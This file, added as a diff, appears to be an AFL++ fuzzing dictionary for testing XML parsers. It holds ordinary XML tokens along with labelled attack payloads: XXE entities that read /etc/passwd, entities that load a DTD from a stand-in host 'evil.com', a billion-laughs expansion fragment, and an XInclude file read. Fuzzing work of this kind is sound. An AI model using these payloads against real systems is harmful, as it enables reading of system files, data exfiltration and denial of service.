@@ -1,0 +1,79 @@
+# AFL++ Dictionary for XML Fuzzing
+# =================================
+# Common XML elements, attributes, and attack payloads
+
+# XML Structure
+"<?xml"
+"version="
+"encoding="
+"<!DOCTYPE"
+"<!ENTITY"
+"<![CDATA["
+"<!--"
+"-->"
+
+# Common Elements
+"<root>"
+"</root>"
+"<item>"
+"</item>"
+"<metadata>"
+"</metadata>"
+"<content>"
+"</content>"
+"<section>"
+"</section>"
+
+# XXE Attack Payloads
+"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
+"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]>"
+"<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">"
+"<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">"
+
+# Billion Laughs Attack
+"<!ENTITY lol \"lol\">"
+"<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">"
+
+# XInclude
+"<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"file:///etc/passwd\"/>"
+
+# Special Characters
+"&lt;"
+"&gt;"
+"&amp;"
+"&quot;"
+"&apos;"
+"&#x3C;"
+"&#x3E;"
+
+# Attribute Injection
+"id=\""
+"name=\""
+"value=\""
+"href=\""
+"src=\""
+
+# Namespace Confusion
+"xmlns=\""
+"xmlns:xsi=\""
+"xsi:schemaLocation=\""
+
+# Large Values
+"A" x 1000
+"B" x 10000
+"C" x 100000
+
+# Null Bytes
+"\x00"
+"\x00\x00"
+
+# Unicode
+"\u0000"
+"\uFFFE"
+"\uFFFF"
+
+# XML Entities
+"&entity;"
+"&undefined;"
+"&recursive;"
+
